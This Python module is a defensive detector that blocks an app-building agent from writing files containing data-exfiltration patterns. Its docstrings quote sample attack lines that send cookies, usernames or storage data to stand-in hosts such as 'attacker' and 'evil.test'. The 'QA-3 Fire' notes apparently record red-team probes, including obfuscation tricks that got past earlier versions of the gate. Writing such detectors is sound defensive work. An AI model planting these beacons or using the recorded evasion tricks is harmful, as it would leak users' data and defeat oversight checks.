"""Outbound-network exfil pattern detector — QA-3 Fires 61 / 70.

Detects the narrow set of source-file patterns that ship user data to an
attacker-controlled URL at runtime. These are defense-in-depth against the
two empirical on-disk failures:

  Fire 61 — `setInterval` + `fetch('https://attacker/', {method:'POST',
            body: JSON.stringify({count})})` — period-poll exfil.
  Fire 70 — `<img src={pixelUrl} style={{display:'none'}} />` with
            `pixelUrl = 'https://attacker/?u=' + username + ...` — 1-pixel
            tracking beacon on every render.

Tsunami apps almost never need outbound network calls — most prompts are
counter / todo / dashboard / generator shapes. The gate blocks three call
shapes with no legitimate use in that context:

  1. `navigator.sendBeacon(externalUrl)` — fire-and-forget beaconing.
  2. Hidden-image tracking pixel: an `<img>` tag whose style sets
     `display: none` (or `visibility: hidden`) AND whose src is an external
     URL (directly or via a template / referenced variable).
  3. `fetch` / `new WebSocket` / `new EventSource` to an external URL where
     the surrounding ~500 chars reference `document.cookie`, `localStorage`,
     `sessionStorage`, `navigator.userAgent`, or `window.location.href` —
     the shape of state-exfil, not a normal data request.

Localhost / 127.* / RFC-1918 / 0.0.0.0 hosts pass (legit dev backends).

Pure function, no torch / no tool imports — unit-testable stand-alone.
"""

from __future__ import annotations

import base64
import re


_PRIVATE_HOST_RE = re.compile(
    r'^(localhost|127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.|0\.0\.0\.0)'
)

# URL scheme pattern — match http:, https:, ws:, wss:, OR protocol-relative
# `//host`. QA-3 Fire 113 pointed out protocol-relative URLs (`//1.2.3.4/x`)
# bypassed the original `https?://` literal because browsers fill in the
# scheme from the host page at request time — a schemeless URL is still an
# outbound call. Optional scheme prefix; `//` is mandatory.
_URL_SCHEME = r'(?:https?:|wss?:)?//'
_URL_SCHEME_HTTP = r'(?:https?:)?//'  # for img src (no ws flavor)


def _is_external(host: str) -> bool:
    return not _PRIVATE_HOST_RE.match(host)


_SOURCE_SUFFIXES = (".tsx", ".ts", ".jsx", ".js", ".mjs", ".cjs", ".html", ".vue", ".svelte")


_EXFIL_STATE_KEYWORDS = re.compile(
    r'document\.cookie'
    r'|localStorage(?:\.getItem|\.\w+)?'
    r'|sessionStorage(?:\.getItem|\.\w+)?'
    r'|navigator\.userAgent'
    r'|window\.location\.href'
    r'|document\.location\.(?:href|host)'
)


def _host_of(url_match_group: str) -> str:
    """Strip trailing path/query from a captured host-plus."""
    # The regex already captures only up to first / or " — but be defensive.
    return url_match_group.split("/")[0].split("?")[0].split("#")[0]


def _scan_sendbeacon(content: str) -> list[str]:
    out = []
    for m in re.finditer(
        rf'\bsendBeacon\s*\(\s*[\'"`]{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"navigator.sendBeacon → {host}")
    return out


def _scan_hidden_pixel(content: str) -> list[str]:
    """Find <img> tags with BOTH display:none (or visibility:hidden) AND an
    external-URL src — either inline, via template literal, or via a
    referenced variable whose value is an external URL string literal.
    """
    out = []
    img_re = re.compile(r'<img\b[^>]*?/?>', re.IGNORECASE | re.DOTALL)

    for m in img_re.finditer(content):
        tag = m.group(0)
        # Must be "hidden" somehow.
        hidden = re.search(
            r'display\s*:\s*[\'"]?none|visibility\s*:\s*[\'"]?hidden',
            tag,
            re.IGNORECASE,
        )
        if not hidden:
            continue

        # Direct inline src.
        direct = re.search(
            rf'src=[\'"`]{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
            tag,
            re.IGNORECASE,
        )
        if direct:
            host = _host_of(direct.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX template literal src={`https://.../${...}`} or schemeless `//...`.
        tpl = re.search(
            rf'src=\{{`{_URL_SCHEME_HTTP}([^`/$\s]+)',
            tag,
            re.IGNORECASE,
        )
        if tpl:
            host = _host_of(tpl.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX variable ref: src={pixelUrl} — resolve to a const/let/var
        # declaration elsewhere in the file. Checks both template and
        # plain-string literal forms.
        var_ref = re.search(r'src=\{(\w+)\}', tag)
        if var_ref:
            var = var_ref.group(1)
            for decl in re.finditer(
                rf'(?:const|let|var)\s+{re.escape(var)}\s*=\s*[`\'"]{_URL_SCHEME_HTTP}([^\'"`/${{\s]+)',
                content,
            ):
                host = _host_of(decl.group(1))
                if _is_external(host):
                    out.append(f"hidden <img> via {var} → {host}")
                    break

    return out


def _scan_html_external_resources(content: str) -> list[str]:
    """QA-3 Fire 120: `<script src="https://evil/x.js">` in index.html loads
    attacker-controlled JS on every page load — worse than fetch-exfil
    (runs with full same-origin privileges: cookies, localStorage, DOM
    access, form hijack, persistence updates without redeploy).

    The existing hidden-<img> scan requires `display:none`; a plain
    `<script src>` / `<iframe src>` / `<link rel="stylesheet" href>` etc.
    isn't hidden and doesn't need to be. Scan HTML for the specific
    dangerous-element + external-URL shapes that execute code or load
    resources with same-origin behavior:

      - <script src="external">
      - <iframe src="external">
      - <object data="external">
      - <embed src="external">
      - <link rel="{stylesheet|manifest|preload|prefetch|modulepreload|
                   dns-prefetch|icon}" href="external">
      - <meta http-equiv="refresh" content="...;url=external">
      - <base href="external">

    NOT blocked (benign shapes):
      - <a href="external"> — user navigation, doesn't execute on load
      - <img src="external"> without display:none — display image,
        handled by the hidden-pixel scan when actually hidden
      - <form action="external"> — user-initiated submit, not load-time
    """
    out = []

    def _flag(label: str, host: str):
        out.append(f"{label} → {host}")

    # <script src="external">
    for m in re.finditer(
        rf'<script\b[^>]*\bsrc=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
        content,
        re.IGNORECASE,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            _flag("<script src>", host)

    # <iframe src="external">
    for m in re.finditer(
        rf'<iframe\b[^>]*\bsrc=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
        content,
        re.IGNORECASE,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            _flag("<iframe src>", host)

    # <object data="external">
    for m in re.finditer(
        rf'<object\b[^>]*\bdata=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
        content,
        re.IGNORECASE,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            _flag("<object data>", host)

    # <embed src="external">
    for m in re.finditer(
        rf'<embed\b[^>]*\bsrc=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
        content,
        re.IGNORECASE,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            _flag("<embed src>", host)

    # <link rel="{stylesheet|manifest|preload|...}" href="external">
    # Order-independent attrs: the `rel` and `href` may appear in either
    # order inside the tag. Capture the full tag, then check both.
    dangerous_rels = {
        "stylesheet", "manifest", "preload", "prefetch",
        "modulepreload", "dns-prefetch", "preconnect", "icon",
        "shortcut icon", "apple-touch-icon", "import",
    }
    for tag_m in re.finditer(r'<link\b[^>]*?/?>', content, re.IGNORECASE):
        tag = tag_m.group(0)
        rel_m = re.search(r'\brel=[\'"]?([^\'"\s>]+)', tag, re.IGNORECASE)
        href_m = re.search(
            rf'\bhref=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
            tag,
            re.IGNORECASE,
        )
        if not rel_m or not href_m:
            continue
        if rel_m.group(1).lower() in dangerous_rels:
            host = _host_of(href_m.group(1))
            if _is_external(host):
                _flag(f'<link rel="{rel_m.group(1)}" href>', host)

    # <meta http-equiv="refresh" content="0; url=external">
    for tag_m in re.finditer(r'<meta\b[^>]*?/?>', content, re.IGNORECASE):
        tag = tag_m.group(0)
        if not re.search(
            r'http-equiv=[\'"]?refresh', tag, re.IGNORECASE
        ):
            continue
        url_m = re.search(
            rf'content=[\'"][^\'"]*?url=\s*{_URL_SCHEME_HTTP}([^\'"\s>;]+)',
            tag,
            re.IGNORECASE,
        )
        if url_m:
            host = _host_of(url_m.group(1))
            if _is_external(host):
                _flag('<meta http-equiv="refresh">', host)

    # <base href="external"> — changes relative URL resolution; any
    # relative fetch / script load hits the attacker origin.
    for m in re.finditer(
        rf'<base\b[^>]*\bhref=[\'"`]?{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
        content,
        re.IGNORECASE,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            _flag("<base href>", host)

    return out


_LOCATION_SINK_RE = re.compile(
    r'\b(?:window|document|top|parent|self)\s*\.\s*location'
    r'(?:\s*\.\s*(?:href|assign|replace))?\s*(?:=|\(\s*)\s*([A-Za-z_$][\w$]*)'
)

_WINDOW_OPEN_RE = re.compile(
    r'\bwindow\s*\.\s*open\s*\(\s*([A-Za-z_$][\w$]*)'
)

_USER_SOURCE_RE = re.compile(
    r'\buseState\s*(?:<[^>]+>)?\s*\(|'
    r'\b(?:searchParams|URLSearchParams)\b|'
    r'\bwindow\s*\.\s*location\s*\.\s*search\b|'
    r'\buseSearchParams\b|'
    r'\buseParams\b|'
    r'\bonChange\s*=\s*(?:\{[^}]*setS|\{\([^)]*\)\s*=>[^}]*setS)'
)


def _scan_open_redirect(content: str, prompt_intent: str = "") -> list[str]:
    """QA-3 Fire 128: `window.location.href = url` where `url` is user
    input. Classic open-redirect gadget — attacker crafts `?url=javascript:
    evil()` → navigation executes arbitrary code in the app's own origin.
    Also covers `window.open(userUrl)` (tab-nabbing + phishing).

    Exempt when the prompt explicitly asks for a URL redirector / opener /
    navigator / shortener / bookmark app (the app's purpose IS the
    navigation primitive).
    """
    out = []
    # Narrow exemption: apps whose primary feature IS safe-redirect.
    # Explicitly does NOT include "url navigator" / bare "redirect" — those
    # are exactly the attacker's framing for Fire 128. The remaining
    # categories are specific enough that the code's redirect IS the
    # advertised function (Bitly, Pinboard, Pocket, etc.).
    intent_hit = any(
        kw in prompt_intent.lower() for kw in (
            "url shortener", "link shortener", "short url",
            "bookmark manager", "read-it-later",
            "safe redirect", "redirect with allowlist",
        )
    )
    if intent_hit:
        return out

    # Any user-input source in the file?
    has_user_source = bool(_USER_SOURCE_RE.search(content))
    if not has_user_source:
        return out

    # Collect the names of identifiers set via useState (and destructuring).
    user_bindings: set[str] = set()
    for m in re.finditer(
        r'(?:const|let|var)\s+\[\s*([A-Za-z_$][\w$]*)\s*,[^\]]*\]'
        r'\s*=\s*useState\b',
        content,
    ):
        user_bindings.add(m.group(1))
    # Also `const url = new URLSearchParams(...).get("url")`.
    for m in re.finditer(
        r'(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*='
        r'[^;]*(?:searchParams|URLSearchParams|location\.search)',
        content,
    ):
        user_bindings.add(m.group(1))
    # Also `const redirectTo = params.get(...)` where `params` is a known
    # user-source — transitive 1 level deep. Cheap heuristic: if the
    # file already has searchParams/URLSearchParams/location.search, any
    # `<id>.get(...)` result is likely user-tainted.
    has_param_source = bool(re.search(
        r'\b(?:searchParams|URLSearchParams|location\s*\.\s*search)\b',
        content,
    ))
    if has_param_source:
        for m in re.finditer(
            r'(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*='
            r'[^;]*\.\s*get\s*\(',
            content,
        ):
            user_bindings.add(m.group(1))

    for m in _LOCATION_SINK_RE.finditer(content):
        var = m.group(1)
        if var in user_bindings:
            out.append(f"location sink ← useState/searchParams var `{var}`")

    for m in _WINDOW_OPEN_RE.finditer(content):
        var = m.group(1)
        if var in user_bindings:
            out.append(f"window.open ← useState/searchParams var `{var}`")

    return out


def _scan_console_leak(content: str) -> list[str]:
    """QA-3 Fire 123: `console.log("cookies:", document.cookie)` — agent
    writes session data to the browser console on mount. Not outbound
    exfil (no URL) but a real info-disclosure channel: dev-tools screen-
    sharing / recording captures session tokens, CI e2e-test stdout
    ends up in CI logs, screen-reader / accessibility tools read the
    console, browser extensions that watch console output silently
    capture credentials.

    Match: console.{log,warn,error,debug,info,table,dir} calls whose
    argument list references one of the sensitive state APIs. Skip
    `console.log("typeof x:", typeof document.cookie)` and similar
    diagnostic shapes by requiring the API to appear as a direct arg
    (not inside `typeof` / `typeof(...)` unary).
    """
    out = []
    # Each call: `console.METHOD(... args ...)`. Match the call + capture
    # the arg list (up to a reasonable 400-char ceiling) and check for
    # the sensitive APIs.
    for m in re.finditer(
        r'\bconsole\s*\.\s*(?:log|warn|error|debug|info|table|dir|trace)'
        r'\s*\(([^)]{0,400})\)',
        content,
    ):
        args = m.group(1)
        # `typeof document.cookie` is a benign diagnostic — skip.
        leaked = []
        for api in (
            "document.cookie",
            "document.location.href",
            "localStorage",
            "sessionStorage",
            "navigator.credentials",
            "navigator.clipboard",
        ):
            if api not in args:
                continue
            # Require the api to NOT be inside a `typeof` / `delete`
            # diagnostic. Check by finding the api's index and looking
            # at the preceding ~15 chars.
            idx = args.find(api)
            before = args[max(0, idx - 15): idx].strip()
            if before.endswith(("typeof", "delete")):
                continue
            leaked.append(api)
        if leaked:
            out.append(f"console.log of {', '.join(leaked)}")
    return out


def _scan_network_with_state(content: str) -> list[str]:
    """fetch / WebSocket / EventSource to an external URL, where nearby
    code reads cookie / localStorage / sessionStorage / userAgent /
    window.location — the state-exfil shape.
    """
    out = []
    for m in re.finditer(
        rf'\b(?:fetch|new\s+WebSocket|new\s+EventSource)\s*\(\s*[\'"`]'
        rf'{_URL_SCHEME}([^\'"`\s/]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if not _is_external(host):
            continue
        start = max(0, m.start() - 300)
        end = min(len(content), m.end() + 500)
        if _EXFIL_STATE_KEYWORDS.search(content[start:end]):
            out.append(f"fetch/WebSocket → {host} (carrying cookie/storage state)")
    return out


_STRING_CONCAT_RE = re.compile(
    r'(["\'])([^"\'`\\\n]*?)\1\s*\+\s*(["\'])([^"\'`\\\n]*?)\3'
)


def _fold_string_concats(content: str) -> str:
    """QA-3 Fire 114: attacker splits the URL across a string-concat —
    `const P1 = "http"; const P2 = "s://attacker/x"; fetch(P1 + P2)` —
    so neither literal matches the gate's `https?://` regex. At runtime
    JS coalesces them.

    Pre-fold adjacent `"X" + "Y"` same-quote literals into `"XY"` so
    the gate's scan runs against the coalesced form. Iterate to convergence
    to collapse N-way chains (`"a" + "b" + "c"` → `"ab" + "c"` → `"abc"`).

    Does NOT touch backticks (template literals) — those have their own
    interpolation semantics; a schemeless / concat template literal is a
    rarer pattern and addressing it requires richer parsing. Tracked as
    a follow-up if QA-3 probes show the variant.

    Also leaves identifier-concat (`P1 + P2`) alone — can't resolve that
    without constant-binding analysis. BUT the *declarations* are string
    literals adjacent in the source; feeding the full source through the
    existing gate AFTER fold doesn't catch `fetch(P1+P2)` directly. The
    trick is: the gate also catches an external hostname appearing in a
    const/var declaration via the hidden-pixel var-ref scan — which we
    generalize below in _scan_const_url_decl for the Fire 114 shape.
    """
    prev = None
    cur = content
    while prev != cur:
        prev = cur
        cur = _STRING_CONCAT_RE.sub(lambda m: f'{m.group(1)}{m.group(2)}{m.group(4)}{m.group(1)}', cur)
    return cur


_BASE64_URL_RE = re.compile(
    r'\batob\s*\(\s*[\'"]([A-Za-z0-9+/=]{12,})[\'"]\s*\)'
)
_BASE64_DECL_RE = re.compile(
    r'(?:const|let|var)\s+(\w+)\s*=\s*[\'"]([A-Za-z0-9+/=]{12,})[\'"]'
)


def _is_external_url_string(s: str) -> bool:
    """True if `s` (stripped) starts with `(https?:)?//` + an external host."""
    s = s.strip()
    m = re.match(r'(?:https?:)?//([^\s/\'"]+)', s)
    return bool(m and _is_external(_host_of(m.group(1))))


def _scan_base64_urls(content: str) -> list[str]:
    """QA-3 Fire 114 variant (b): `atob("aHR0cHM6Ly9ldmlsLnRlc3QvZXZpbA==")`.
    Attacker base64-encodes the URL so no literal `https://` appears in
    source; at runtime `atob` decodes back. Regex scans miss it. Decode
    inline atob calls; if the result is an external URL, flag it.

    Also handles the one-level-indirection shape:
      `const b64 = "aHR0...=="; const url = atob(b64);`
    — scan const/let/var declarations whose VALUE is a base64 string that
    decodes to an external URL.
    """
    out = []

    # Inline atob("..."): decode and check.
    for m in _BASE64_URL_RE.finditer(content):
        try:
            decoded = base64.b64decode(m.group(1), validate=True).decode(
                "utf-8", errors="replace"
            )
        except (ValueError, base64.binascii.Error):
            continue
        if _is_external_url_string(decoded):
            # Extract host for the error message.
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', decoded.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"atob-decoded URL → {host}")

    # Declared base64 constant (only if there's also an atob call in the
    # same file — otherwise it's just data, not a URL-decode).
    if not re.search(r'\batob\s*\(', content):
        return out
    for m in _BASE64_DECL_RE.finditer(content):
        try:
            decoded = base64.b64decode(m.group(2), validate=True).decode(
                "utf-8", errors="replace"
            )
        except (ValueError, base64.binascii.Error):
            continue
        if _is_external_url_string(decoded):
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', decoded.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"atob-decoded URL via {m.group(1)} → {host}")

    return out


def _scan_new_url_constructor(content: str) -> list[str]:
    """QA-3 Fire 114 variant (c): `new URL(path, "https://evil.test")`.
    The browser `URL(input, base)` constructor accepts a base URL as the
    second arg and resolves relative `input` against it — valid exfil
    channel that's not a plain `fetch("string")` pattern. Also catches
    single-arg `new URL("https://evil.test/x")`.

    Runs AFTER fold, so concat'd forms like `new URL(p, "http" + "s://…")`
    are flattened to a literal first.
    """
    out = []
    # Two-arg form: `new URL(<arg>, "URL")`.
    for m in re.finditer(
        r'\bnew\s+URL\s*\(\s*[^,]+?,\s*[\'"`]'
        rf'{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"new URL(..., base=...) → {host}")
    # Single-arg form: `new URL("URL")`.
    for m in re.finditer(
        rf'\bnew\s+URL\s*\(\s*[\'"`]{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"new URL(\"...\") → {host}")
    return out


def _scan_reverse_string_url(content: str) -> list[str]:
    """QA-3 Fire 114 variant (d): `".reversed".split("").reverse().join("")`.
    Common JS obfuscation: hide the URL by storing it reversed, then
    un-reverse at runtime. Match the canonical shape, reverse server-side,
    check if the result is an external URL.
    """
    out = []
    # The idiom can be called on a string literal OR on a variable. Match
    # both: first the literal form.
    for m in re.finditer(
        r'[\'"`]([^\'"`]{6,})[\'"`]\s*\.\s*split\s*\(\s*[\'"`]{2}\s*\)\s*'
        r'\.\s*reverse\s*\(\s*\)\s*\.\s*join\s*\(\s*[\'"`]{2}\s*\)',
        content,
    ):
        reversed_s = m.group(1)[::-1]
        if _is_external_url_string(reversed_s):
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', reversed_s.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"reverse-string URL → {host}")
    # Indirection: `const s = "REVERSED"; s.split("").reverse().join("")`.
    # If the file uses the reverse idiom on a variable AND that variable's
    # value reversed is an external URL, flag.
    uses_reverse = re.search(
        r'\.\s*split\s*\(\s*[\'"`]{2}\s*\)\s*\.\s*reverse\s*\(\s*\)\s*\.\s*join',
        content,
    )
    if uses_reverse:
        for m in re.finditer(
            r'(?:const|let|var)\s+(\w+)\s*=\s*[\'"]([^\'"`\n]+)[\'"]',
            content,
        ):
            reversed_s = m.group(2)[::-1]
            if _is_external_url_string(reversed_s):
                host_m = re.match(
                    r'(?:https?:)?//([^\s/\'"]+)', reversed_s.strip()
                )
                host = _host_of(host_m.group(1)) if host_m else "unknown"
                out.append(
                    f"reverse-string URL via {m.group(1)} → {host}"
                )
    return out


def _scan_fromCharCode_url(content: str) -> list[str]:
    """QA-3 Fire 117 note (untested variant): `String.fromCharCode(104, 116,
    116, 112, 115, 58, 47, 47, ...)`. Attacker encodes each character of
    the URL as its integer codepoint to hide the literal from source
    scanners. At runtime, JS reconstructs the string.

    Match the call, parse the arg list (decimal / hex ints), build the
    resulting string, allowlist-check.
    """
    out = []
    for m in re.finditer(
        r'String\s*\.\s*fromCharCode\s*\(([^)]+)\)',
        content,
    ):
        args = m.group(1)
        chars: list[str] = []
        ok = True
        for tok in args.split(","):
            tok = tok.strip()
            if not tok:
                continue
            # Accept decimal, 0xHEX, or a single-char arithmetic expression
            # like `0x68`. Skip anything else (arithmetic, variables).
            try:
                n = int(tok, 0) if tok.startswith(("0x", "0X")) else int(tok)
            except ValueError:
                ok = False
                break
            if n < 0 or n >= 0x110000:
                ok = False
                break
            chars.append(chr(n))
        if not ok:
            continue
        s = "".join(chars)
        if _is_external_url_string(s):
            host_m = re.match(r'(?:https?:)?//([^\s/\'"]+)', s.strip())
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"String.fromCharCode → {host}")
    return out


def _decode_u_escapes(s: str) -> str:
    """Decode only `\\uXXXX` sequences — leave other backslash-sequences alone."""
    return re.sub(
        r'\\u([0-9a-fA-F]{4})',
        lambda m: chr(int(m.group(1), 16)),
        s,
    )


def _scan_unicode_escape_url(content: str) -> list[str]:
    """QA-3 Fire 117 note (untested variant): `"\\u0068\\u0074\\u0074\\u0070
    \\u0073\\u003a\\u002f\\u002f\\u0065\\u0076\\u0069\\u006c..."`. Attacker
    expresses each URL character as its \\uXXXX codepoint. The source file
    holds the escape sequences literally; JS decodes at parse time.

    Find string literals containing 3+ `\\uXXXX` sequences, decode, check
    for external URL. 3-sequence threshold filters typical emoji / i18n
    uses (which are rarely this dense).
    """
    out = []
    for m in re.finditer(r'[\'"]([^\'"]{6,})[\'"]', content):
        s = m.group(1)
        if s.count("\\u") < 3:
            continue
        decoded = _decode_u_escapes(s)
        if _is_external_url_string(decoded):
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', decoded.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"unicode-escape URL → {host}")
    return out


def _scan_split_url_declarations(content: str) -> list[str]:
    """Fire 114: direct detection of the split-URL pattern regardless of
    constant-folding. Find pairs of adjacent const/let/var declarations
    where the string literals, concatenated, form an external URL.

    Also (Fire 118): SINGLE decl whose value IS an external URL — gated
    on the file containing any fetch / sendBeacon / WebSocket / EventSource
    call. Catches the `const url = "..."; fetch(url)` indirection shape
    that neither the fold nor the literal-arg scans see.
    """
    out = []
    # Capture const/let/var <name> = "literal" on each line. Also handle
    # destructuring-with-default forms like `const [url, setUrl] =
    # useState("...")` — anywhere a string literal with a URL shape
    # is assigned to a named binding.
    decl_re = re.compile(
        r'(?:const|let|var)\s+(?:\w+|\[[^\]]+\])\s*=\s*[^"\'`\n]*?["\']([^"\'`\n]*)["\']'
    )
    named_decl_re = re.compile(
        r'(?:const|let|var)\s+(\w+)\s*=\s*["\']([^"\'`\n]*)["\']\s*;?'
    )
    named_decls = [(m.group(1), m.group(2)) for m in named_decl_re.finditer(content)]
    # Look at adjacent named declarations whose values concatenated would
    # form http(s)://host/... with an external host.
    for i in range(len(named_decls) - 1):
        joined = named_decls[i][1] + named_decls[i + 1][1]
        m = re.match(r'(?:https?:)?//([^/\s]+)', joined)
        if m and _is_external(_host_of(m.group(1))):
            out.append(
                f"split-URL declarations {named_decls[i][0]} + {named_decls[i+1][0]} → {_host_of(m.group(1))}"
            )
        if i + 2 < len(named_decls):
            joined3 = joined + named_decls[i + 2][1]
            m3 = re.match(r'(?:https?:)?//([^/\s]+)', joined3)
            if m3 and _is_external(_host_of(m3.group(1))):
                out.append(
                    f"split-URL declarations {named_decls[i][0]} + {named_decls[i+1][0]} + {named_decls[i+2][0]} → {_host_of(m3.group(1))}"
                )

    # Fire 118: single decl holding a full external URL whose binding name
    # is ALSO passed to a network-call primitive. Attack shape:
    #   const url = "https://evil.test/x"; fetch(url);
    #   const [url, setUrl] = useState("https://evil.test/x"); fetch(url);
    # Gating on "binding name used as network-call arg" avoids the false-
    # positive of `const docsUrl = "https://..."; <a href={docsUrl}/>` —
    # external URLs for user-visible navigation / display are fine.
    binding_decl_re = re.compile(
        r'(?:const|let|var)\s+(\w+|\[[^\]]+\]|\{[^}]+\})\s*=\s*[^"\'`\n]*?["\']([^"\'`\n]+)["\']'
    )
    for m in binding_decl_re.finditer(content):
        binding = m.group(1)
        val = m.group(2)
        um = re.match(r'(?:https?:)?//([^/\s]+)', val.strip())
        if not um:
            continue
        host = _host_of(um.group(1))
        if not _is_external(host):
            continue
        # Extract bound names from the binding expression.
        if binding.startswith("["):
            names = re.findall(r'\w+', binding)[:1]  # first positional only
        elif binding.startswith("{"):
            names = re.findall(r'\w+', binding)
        else:
            names = [binding]
        # Any of these names used as a network-call first arg?
        for n in names:
            if re.search(
                rf'\b(?:fetch|sendBeacon|new\s+WebSocket|new\s+EventSource)\s*\(\s*{re.escape(n)}\b',
                content,
            ):
                out.append(f"const URL decl {n} used in network call → {host}")
                break
    return out


def check_outbound_exfil(content: str, filename: str, prompt_intent: str = "") -> str | None:
    """Return a BLOCKED error string if `content` (the bytes about to be
    written to `filename`) matches an outbound-network exfil pattern.
    Returns None if clean (most calls).

    Only scans source-like file extensions. Config-shape files (.env*,
    .npmrc, etc.) are handled by a separate gate in filesystem.py.

    `prompt_intent` (optional): the session task prompt — used for
    exemption logic (e.g. the open-redirect scan passes when the app's
    declared purpose IS navigation).
    """
    name_lower = filename.lower()
    if not name_lower.endswith(_SOURCE_SUFFIXES):
        return None

    # Fire 114: fold `"X" + "Y"` → `"XY"` so the existing regex-based
    # scans see the coalesced URL even when the source splits it.
    folded = _fold_string_concats(content)

    offenders: list[str] = []
    offenders.extend(_scan_sendbeacon(folded))
    offenders.extend(_scan_hidden_pixel(folded))
    offenders.extend(_scan_network_with_state(folded))
    # Fire 123: console.log of cookie / localStorage / etc. — not outbound,
    # still info-disclosure through a different channel (dev-tools, CI logs).
    offenders.extend(_scan_console_leak(folded))
    # Fire 128: `window.location.href = userInput` open-redirect sink.
    # Prompt-intent exempted apps (URL navigator, shortener, bookmark).
    offenders.extend(_scan_open_redirect(folded, prompt_intent))
    # QA-3 Fire 120: HTML external-resource shapes (script src, link href,
    # iframe src, etc.). Runs on folded content so split-concat forms in
    # inline `<script>...</script>` bodies work the same way.
    offenders.extend(_scan_html_external_resources(folded))
    # Fire 114: the exact shape is `const P1 = "http"; const P2 = "s://..."`
    # — two SEPARATE declarations, NOT joined by a `+` in source. Neither
    # fold nor the main scans catch it. Explicit detector for adjacent
    # declarations whose values concatenate to an external URL.
    offenders.extend(_scan_split_url_declarations(content))
    # Fire 114 variant (b): `atob("aHR0...")` base64 obfuscation.
    offenders.extend(_scan_base64_urls(content))
    # Fire 114 variant (c): `new URL(path, "https://host/")` constructor.
    offenders.extend(_scan_new_url_constructor(folded))
    # Fire 114 variant (d): `"REVERSED".split("").reverse().join("")`.
    offenders.extend(_scan_reverse_string_url(content))
    # Fire 117 variants: `String.fromCharCode(...)` + `\\uXXXX\\uYYYY...`.
    offenders.extend(_scan_fromCharCode_url(content))
    offenders.extend(_scan_unicode_escape_url(content))

    if not offenders:
        return None

    uniq = sorted(set(offenders))
    return (
        f"BLOCKED: {filename} contains outbound-network exfiltration "
        f"pattern(s): {'; '.join(uniq[:3])}. These are QA-3 Fire 61 / Fire 70 "
        f"attack shapes (hidden tracking pixel, sendBeacon beaconing, "
        f"fetch/WebSocket carrying cookie / localStorage / userAgent / "
        f"location state to an external host). Typical tsunami deliverables "
        f"don't need outbound calls — if genuinely required, point at "
        f"localhost / a private-net host or surface the data in a visible "
        f"UI element instead of a hidden beacon."
    )
